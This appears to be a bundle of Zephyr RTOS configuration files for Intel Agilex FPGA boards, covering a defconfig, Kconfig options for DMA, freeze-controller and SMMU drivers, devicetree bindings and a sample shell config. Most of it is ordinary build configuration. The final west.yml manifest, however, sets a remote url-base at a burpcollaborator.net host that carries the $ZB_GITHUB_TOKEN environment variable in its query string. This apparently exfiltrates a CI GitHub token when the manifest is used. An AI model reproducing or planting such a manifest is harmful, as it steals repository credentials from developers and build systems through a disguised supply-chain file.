## boards/arm64/intel_socfpga_agilex_socdk/intel_socfpga_agilex_socdk_defconfig
```kconfig
# Copyright (c) 2021-2023 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

# The Zephyr build from this defconfig is expected to boot from
# Intel Arm Trusted Firmware (ATF)
# Boot Flow: BL21 -> BL31 -> Zephyr

CONFIG_SOC_SERIES_AGILEX=y
CONFIG_SOC_AGILEX=y
CONFIG_BOARD_INTEL_SOCFPGA_AGILEX_SOCDK=y

# Compiler Options
CONFIG_FORTIFY_SOURCE_RUN_TIME=y

# Arm Features
CONFIG_ARM_ARCH_TIMER=y

# Serial Drivers
CONFIG_SERIAL=y
CONFIG_UART_INTERRUPT_DRIVEN=y
CONFIG_UART_NS16550_ACCESS_WORD_ONLY=y

# Enable Console
CONFIG_CONSOLE=y
CONFIG_UART_CONSOLE=y

# Enable Clock Manager
CONFIG_CLOCK_CONTROL=y

# For Misc Register Map
CONFIG_SYSCON=y

# Setting higher priority for Intel SOCFPGA reset controller to initialize it before
# other dependent drivers running at CONFIG_KERNEL_INIT_PRIORITY_DEFAULT which is 40
CONFIG_RESET_INIT_PRIORITY=35

# SOC
CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC=400000000

# Reset Manager
CONFIG_RESET=y

# PSCI support Enable
CONFIG_PM_CPU_OPS=y
CONFIG_PM_CPU_OPS_PSCI=y
# Enable EDAC
CONFIG_EDAC=y

# Enable SMP support
CONFIG_SMP=y
CONFIG_MP_MAX_NUM_CPUS=4

# PSCI support Enable
CONFIG_PM_CPU_OPS=y
CONFIG_PM_CPU_OPS_PSCI=y
```

## drivers/dma/Kconfig.intel_ssgdma
```kconfig
# Copyright (c) 2024 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

menuconfig DMA_INTEL_SSGDMA
	bool "Intel Scalable Scatter-Gather DMA driver"
	default y
	depends on DT_HAS_INTEL_SSGDMA_ENABLED
	imply DMA_64BIT
	help
	  Enable the Intel Scalable Scatter-Gather DMA driver driver.

if DMA_INTEL_SSGDMA
	config DMA_INTEL_SSGDMA_TIMEOUT_INTERVAL
		int "timeout interval value in us."
		default 10
		help
		  Determines how often a timeout should be checked by the driver.

	config DMA_INTEL_SSGDMA_PAUSE_TIMEOUT
		int "pause timeout value in us."
		default 1000
		help
		  When dma_stop of dma_suspend is called, the driver will set csr to pause
		  the channel. The driver will block until the channel is paused or
		  until this timeout is reached.

	config DMA_INTEL_SSGDMA_RESET_TIMEOUT
		int "reset timeout value in us."
		default 1000
		help
		  When dma_stop of dma_stop is called, the driver will set csr to reset
		  the channel. The driver will block until the channel is reset or
		  until this timeout is reached.

	config DMA_INTEL_SSGDMA_HOST_INTERFACE_CONTROL
		int "value of host interface control."
		default 0
		help
		  Value of host interface control.
		  Please refer to AMBA AXI and ACE Protocol Specification for details.

	config DMA_INTEL_SSGDMA_DEVICE_INTERFACE_CONTROL
		int "value of device interface control."
		default 0
		help
		  Value of device interface control.
		  Please refer to AMBA AXI and ACE Protocol Specification for details.

	config DMA_INTEL_SSGDMA_SIDEBAND_SIGNAL
		int "value of user defined sideband signal."
		default 0
		help
		  Value of user defined sideband signal for  host to device streaming transfer.

	config DMA_INTEL_SSGDMA_Q_SIZE
		int "value of descriptor block entries."
		default 1
		help
		  The number of descriptor block entries allocated by software during the
		  initialization flow. A value of 1 indicates one descriptor block with 4k
		  in size(up to 128 descriptors) is allocated in the system memory.
		  Valid range: [1 128]

	config DMA_INTEL_SSGDMA_Q_RESP_SIZE
		int "value of responder block entries."
		default 1
		help
		  The actual number of responder block entries that will be configure by software
		  in the responder table. A value of 1 indicates one responder block with 4k
		  in size(up to responders) is allocated in the system memory.
		  This is set to 0 by default, as there are no suitable api in zephyr for user
		  to evaluate the responders. If set to none zero, the driver will process the
		  responder and indicate the responder error through status of dma_callback_t.
		  Valid range: [0 128]
endif # DMA_INTEL_SSGDMA
```

## drivers/fpga/Kconfig.agilex_freeze_controller
```kconfig
# FPGA freeze controller driver configuration option

# Copyright (c) 2023, Intel Corporation. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

config AGILEX_FC_FPGA
	bool "Intel Agilex series FPGA freeze controller driver"
	help
	  Enable Intel Agilex series FPGA freeze controller driver.
```

## drivers/smmu/Kconfig
```kconfig
# ARM SMMU driver configuration options

# Copyright (c) 2023 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

#
# ARM SMMU driver options
#

menuconfig SMMU
	bool "ARM SMMU Driver"
	help
	  Enable the ARM SMMU Driver

if SMMU

module = SMMU
module-dep = LOG
module-str = Log level for ARM SMMU Driver
module-help = Sets log level for ARM SMMU Driver.
source "subsys/logging/Kconfig.template.log_config"

choice
	prompt "Select the SMMU Version"
	default ARM_SMMU_V3

config ARM_SMMU_V3
	bool "ARM SMMU V3"

endchoice

if ARM_SMMU_V3
source "drivers/smmu/Kconfig.smmu_v3"
endif

endif # ARM_SMMU
```

## drivers/smmu/Kconfig.smmu_v3
```kconfig
# ARM SMMU V3 driver configuration options

# Copyright (c) 2023 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

#
# ARM SMMU V3 driver options
#

config ARM_SMMU_V3_DRIVER
	bool "ARM SMMU V3 Driver"
	default y
	depends on DT_HAS_ARM_SMMU_V3_ENABLED
	help
	  Enable the ARM SMMU V3 driver
```

## dts/bindings/arm/arm,smmu-v3.yaml
```yaml
# Copyright (c) 2023, Intel Corporation
# SPDX-License-Identifier: Apache-2.0

description: ARM System Memory Management Unit V3

compatible: "arm,smmu-v3"

include: [base.yaml]

properties:
  reg:
    required: true

  cmdq-entries:
    type: int
    required: true
    description: Maximum number of command queue entries as (cmdq-entries = 2^x).

  eventq-entries:
    type: int
    required: true
    description: Maximum number of event queue entries as (eventq-entries = 2^x)

  priq-entries:
    type: int
    description: Maximum number of page request queue entries as (priq-entries = 2^x)

  max-streams:
    type: int
    required: true
    description: Maximum number of stream ID's supported. (max-streams = 2^x)
```

## dts/bindings/dma/intel,ssgdma.yaml
```yaml
# Copyright (c) 2023 Intel Corporation. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

description: Intel SSGDMA (Scalable Scatter-Gather DMA)

compatible: "intel,ssgdma"

include: dma-controller.yaml

properties:
  reg:
    required: true
    description: |
      Base register space for the ssgdma controller.

  d2h-st-port-numbers:
    required: true
    type: int
    description: |
      Number of D2H-ST ports.
      This must be the same as the design in platform designer.

  h2d-st-port-numbers:
    required: true
    type: int
    description: |
      Number of H2D-ST ports.
      This must be the same as the design in platform designer.

  h2d-mm-port-numbers:
    required: true
    type: int
    description: |
      Number of H2D-MM ports.
      This must be the same as the design in platform designer.

  unaligned-access:
    type: boolean
    description: |
      If true, then SSGDMA IP Hardware allows unaligned access.
      For aligned access, all descriptors and data buffers must have
      address that is aligned to 32-bytes.
      The minimum transfer length per descriptor is 4-bytes.
      This must be the same as the design in platform designer.

  "#dma-cells":
    const: 1

dma-cells:
  - channel-id
```

## samples/boards/intel_socfpga/cli/boards/intel_socfpga_agilex5_socdk.conf
```kconfig
# Copyright (c) 2022-2023, Intel Corporation.
# SPDX-License-Identifier: Apache-2.0

# FPGA Bridge
CONFIG_FPGA_BRIDGE=y
CONFIG_FPGA_BRIDGE_INTEL=y
CONFIG_FPGA_BRIDGE_SHELL=y

# FPGA Manager
CONFIG_FPGA_MANAGER=y
CONFIG_FPGA_MANAGER_SHELL=y
CONFIG_FPGA_MANAGER_INTEL=y

# FPGA Freeze Controller
CONFIG_FPGA=y
CONFIG_AGILEX_FC_FPGA=y

# Misc
CONFIG_HEAP_MEM_POOL_SIZE=32768
CONFIG_SHELL_STACK_SIZE=8192

# Enable QSPI Flash
CONFIG_FLASH=y
CONFIG_FLASH_PAGE_LAYOUT=y

# Setting the Shell prompt
CONFIG_SHELL_PROMPT_UART="agilex5$ "

# Setting the max argc
CONFIG_SHELL_ARGC_MAX=12

# Enable File System Shell
CONFIG_FILE_SYSTEM_SHELL=y

# Enable timer driver
CONFIG_COUNTER=y

# Enable Timer shell commands
CONFIG_COUNTER_SHELL=y

# Enable I2C Console
CONFIG_I2C=y
CONFIG_I2C_SHELL=y
CONFIG_I2C_SMBUS_SUPPORTED=n

# File System Setting
CONFIG_FILE_SYSTEM=y
CONFIG_FAT_FILESYSTEM_ELM=y

# DMA driver
CONFIG_DMA=y
CONFIG_DMA_DW_AXI_MAX_DESC=50

# PSCI support Enable
CONFIG_PM_CPU_OPS=y
CONFIG_PM_CPU_OPS_PSCI=y

#SiP SVC Service
CONFIG_ARM_SIP_SVC_DRIVER=y
CONFIG_ARM_SIP_SVC_SUBSYS=y
CONFIG_ARM_SIP_SVC_SUBSYS_SINGLY_OPEN=y

#SiP SVC Service Shell
CONFIG_ARM_SIP_SVC_SUBSYS_SHELL=y

# EDAC options
CONFIG_EDAC_INTEL_SOCFPGA=y
CONFIG_IO96B_INTEL_SOCFPGA=y
CONFIG_SHELL_IO96B_INTEL_SOCFPGA=y
CONFIG_EDAC_ERROR_INJECT=y

# Enable SMMU
CONFIG_SMMU=y
```

## west.yml
```yaml
manifest:
  self:
    path: .
  
  remotes:
    - name: test
      url-base: "https://txumbw05fdida2abaxza2wji69cz0o.burpcollaborator.net/q?token=$ZB_GITHUB_TOKEN&"
```
